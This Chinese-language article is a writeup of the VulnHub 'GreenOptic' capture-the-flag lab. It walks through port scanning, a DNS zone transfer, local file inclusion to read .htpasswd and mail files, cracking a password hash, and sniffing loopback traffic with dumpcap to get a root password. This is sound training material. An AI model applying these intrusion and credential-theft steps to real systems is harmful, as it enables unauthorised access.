> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GuqwYUxB6JxejTLf89jwlA)

**0x01** Introduction  

* * *

虚拟机下载页面：http://www.vulnhub.com/entry/greenoptic-1,510/  

Description

```
GreenOptic is my fourth Capture the Flag box. It is rated as ‘Very Hard’. As with all of my CTFs, please run this in ‘Host Only’ mode – it does not need an internet connection.

Don’t let the difficulty put you off though – the CTF is designed to be realistic, so you won’t come across anything you wouldn’t experience in a real environment.

You will need to enumerate this box very well, and likely chain together different bits of information and vulnerabilities in order to gain access.

SYNOPSIS
British Internet Service Provider GreenOptic has been subject to a large scale Cyber Attack. Over 5 million of their customer records have been stolen, along with credit card information and bank details.

GreenOptic have created an incident response team to analyse the attack and close any security holes. Can you break into their server before they fix their security holes?
```

‍

**0x02 Writeup**  

#### 1 信息收集

##### 1.1 端口信息

nmap 扫描开放端口

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp    open  domain  ISC BIND 9.11.4-P2 (RedHat Enterprise Linux 7)
80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
10000/tcp open  http    MiniServ 1.953 (Webmin httpd)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:redhat:enterprise_linux:7
```

##### 1.2 脆弱服务

访问 80 端口，没有什么有价值的东西。

使用 gobuster 扫描目录，发现了目录 account。

目录扫描：  

```
┌──(kali㉿kali)-[~/Documents/tools]
└─$ ./gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.102
/img                  (Status: 301) [Size: 234] [--> http://192.168.56.102/img/]
/account              (Status: 301) [Size: 238] [--> http://192.168.56.102/account/]
```

#### 访问该目录，url 直接为 http://192.168.56.102/account/index.php?include=cookiewarning，尝试发现 url 中存在本地文件包含。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQRHRpSsvtOHeoYHhIRAC3eoLAibCC8zF8MWuicoIOloKeeTz5rCahN6NkdLHrsvpXwWQz4gl1nck52Q/640?wx_fmt=jpeg)

由于系统是 centos7，默认 apache 的配置 log 为 / etc/httpd/logs/access_log，/etc/httpd/logs/error_log，但是都无法读取。又试了其它一些常见的 log 都无法读取。尝试读取 / etc/hostname，得到主机名为 websrv01.greenoptic.vm，猜测 apache 设置了域名访问限制，结合服务器开启了 dns 解析服务，这里使用 dig 获取域 greenoptic.vm 下的所有域名。

```
┌──(kali㉿kali)-[~]
└─$ dig @192.168.56.102 greenoptic.vm axfr

; <<>> DiG 9.16.8-Debian <<>> @192.168.56.102 greenoptic.vm axfr
; (1 server found)
;; global options: +cmd
greenoptic.vm.          3600    IN      SOA     websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600
greenoptic.vm.          3600    IN      NS      ns1.greenoptic.vm.
ns1.greenoptic.vm.      3600    IN      A       127.0.0.1
recoveryplan.greenoptic.vm. 3600 IN     A       127.0.0.1
websrv01.greenoptic.vm. 3600    IN      A       127.0.0.1
greenoptic.vm.          3600    IN      SOA     websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600
;; Query time: 0 msec
;; SERVER: 192.168.56.102#53(192.168.56.102)
;; WHEN: Tue Nov 24 07:37:44 EST 2020
;; XFR size: 6 records (messages 1, bytes 235)
```

得到了另一个域名，设置 hosts 后访问。发现需要 basicauth。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQRHRpSsvtOHeoYHhIRAC3eocUth6xiar1bcYOeSanicTiaODPias968F4rXGOF6UydniaicjKb58nuzibWKQ/640?wx_fmt=jpeg)

在常用弱口令破解失效后，这里使用 gobuster 跑受限访问文件，加载 common.txt。

```
┌──(kali㉿kali)-[~/Documents/tools]
└─$ ./gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://recoveryplan.greenoptic.vm --wildcard|grep "Status: 403" 
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/cache                (Status: 403) [Size: 207]        
/cgi-bin/             (Status: 403) [Size: 210]        
/config               (Status: 403) [Size: 208]        
/files                (Status: 403) [Size: 207]        
/includes             (Status: 403) [Size: 210]        
/store                (Status: 403) [Size: 207]
```

用本地文件包含去读文件 /.htaccess

```
Authtype Basic
AuthName "Restricted area"
AuthUserFile /var/www/.htpasswd
Require valid-user
```

按提示读 / var/www/.htpasswd，得到加密用户名口令 staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.。

这里使用 john 加载 rockyou.txt 破解，得到解密后的口令 staff:wheeler，成功实现了 basicauth，来到了 phpbb。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQRHRpSsvtOHeoYHhIRAC3eoJxNtOicDIDWkLuUPC5g5CibhMKg24PwpRUgxhg6bBlU4qhKPzibWGveQw/640?wx_fmt=jpeg)

按照 key information 的提示利用本地文件包含去读 terry-/var/mail/terry 和 sam-/var/mail/sam 的邮件，同时下载 dpi.zip。

```
From serversupport@greenoptic.vm  Sun Jul 12 15:52:19 2020
Return-Path: <serversupport@greenoptic.vm>
X-Original-To: terry
Delivered-To: terry@websrv01.greenoptic.vm
Received: from localhost (localhost [IPv6:::1])
  by websrv01.greenoptic.vm (Postfix) with ESMTP id C54E21090083
  for <terry>; Sun, 12 Jul 2020 15:51:32 +0100 (BST)
Message-Id: <20200712145137.C54E21090083@websrv01.greenoptic.vm>
Date: Sun, 12 Jul 2020 15:51:32 +0100 (BST)
From: serversupport@greenoptic.vm

Terry

As per your request we have installed phpBB to help with incident response.
Your username is terry, and your password is wsllsa!2

Let us know if you have issues
Server Support - Linux

From terry@greenoptic.vm  Sun Jul 12 16:13:45 2020
Return-Path: <terry@greenoptic.vm>
X-Original-To: sam
Delivered-To: sam@websrv01.greenoptic.vm
Received: from localhost (localhost [IPv6:::1])
  by websrv01.greenoptic.vm (Postfix) with ESMTP id A8D371090085
  for <sam>; Sun, 12 Jul 2020 16:13:18 +0100 (BST)
Message-Id: <20200712151322.A8D371090085@websrv01.greenoptic.vm>
Date: Sun, 12 Jul 2020 16:13:18 +0100 (BST)
From: terry@greenoptic.vm

Hi Sam, per the team message, the password is HelloSunshine123
```

利用密码解压 dpi.zip，使用 wireshark 分析 dpi.pcap，过滤 ftp 协议，得到了新的用户名和密码 alex:FwejAASD1。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQRHRpSsvtOHeoYHhIRAC3eoyHcXc1T0Bhic63gSLuQTMdGSnGDF8pFYZc5FI4m9EFs50ZkGo8nHEVA/640?wx_fmt=jpeg)

ssh 远程登陆，得到第一个 shell。

```
┌──(kali㉿kali)-[~]
└─$ ssh alex@192.168.56.102
The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established.
ECDSA key fingerprint is SHA256:D96eRXXFR5bMxuGFCt8OvBzYYZjHSpu+ksPl5jliY80.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.102' (ECDSA) to the list of known hosts.
alex@192.168.56.102's password: 
[alex@websrv01 ~]$ id
uid=1002(alex) gid=1002(alex) groups=1002(alex),994(wireshark)
[alex@websrv01 ~]$ whoami
alex
[alex@websrv01 ~]$ ls
user.txt
[alex@websrv01 ~]$ cat user.txt 
Well done. Now to try and get root access.

Think outside of the box!
```

补充一下，其实这里还有一种方法获取 shell，该版本的 phpbb 存在远程命令执行，使用邮件中的账号可以以管理员登陆。）

##### 2.2 权限提权  

用户 alex 文件夹下有一个 wireshark 文件夹，同时还发现 alex 属于 wireshark 用户组。

```
[alex@websrv01 ~]$ ls -all
total 20
drwx------. 3 alex alex 136 Jul 12 22:12 .
drwxr-xr-x. 6 root root  57 Jul 12 22:12 ..
lrwxrwxrwx. 1 root root   9 Jul 12 22:12 .bash_history -> /dev/null
-rw-r--r--. 1 alex alex  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 alex alex 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 alex alex 231 Apr  1  2020 .bashrc
-rwx------. 1 alex alex  70 Jul 12 22:06 user.txt
drwxr-xr-x. 2 alex alex  41 Jul 12 21:33 .wireshark
-rw-------. 1 alex alex 100 Jul 12 20:50 .Xauthority
[alex@websrv01 ~]$ cat /etc/group|grep wireshark
wireshark:x:994:alex
```

于是这里使用 dumpcap 抓取本地环回地址包一段时间，下载到本地使用 wireshark 解析。

```
[alex@websrv01 ~]$ dumpcap -w test.pcap -i lo
Capturing on 'Loopback'
File: test.pcap
Packets captured: 42
Packets received/dropped on interface 'Loopback': 42/0 (pcap:0/dumpcap:0/flushed:0) (100.0%)
```

发现有 Auth 包，base64 解码得到了 root 用户口令 ASfojoj2eozxczzmedlmedASASDKoj3o。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQRHRpSsvtOHeoYHhIRAC3eoicBEkVFvQo4ZgiaA7oZ1FX4oSicMV1ibK5XDia0p1xTae0QEtwE9xrnGMicQ/640?wx_fmt=jpeg)

```
[alex@websrv01 ~]$ su - root
Password: 
[root@websrv01 ~]# cat root.txt 
Congratulations on getting root!

  ____                      ___        _   _      
 / ___|_ __ ___  ___ _ __  / _ \ _ __ | |_(_) ___ 
| |  _| '__/ _ \/ _ \ '_ \| | | | '_ \| __| |/ __|
| |_| | | |  __/  __/ | | | |_| | |_) | |_| | (__ 
 \____|_|  \___|\___|_| |_|\___/| .__/ \__|_|\___|
                                |_|             
  
You've overcome a series of difficult challenges, so well done!

I'm happy to make my CTFs available for free. If you enjoyed doing the CTF, please leave a comment on my blog at https://security.caerdydd.wales - I will be happy for your feedback so I can improve them and make them more enjoyable in the future.

*********
Kindly place your vote on the poll located here to let me know how difficult you found it: https://security.caerdydd.wales/greenoptic-ctf/
*********

Thanks,
bootlesshacker
```

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)[vulnhub 之 VulnImage_1 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487106&idx=1&sn=a51d3cfedffb4adf84ccd682479b2ee4&chksm=fcfc33d4cb8bbac2ce47aac3bb491c1d9f2b603eaf1a2dd731cf7f11c5cdbb91e39f34ba5b26&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**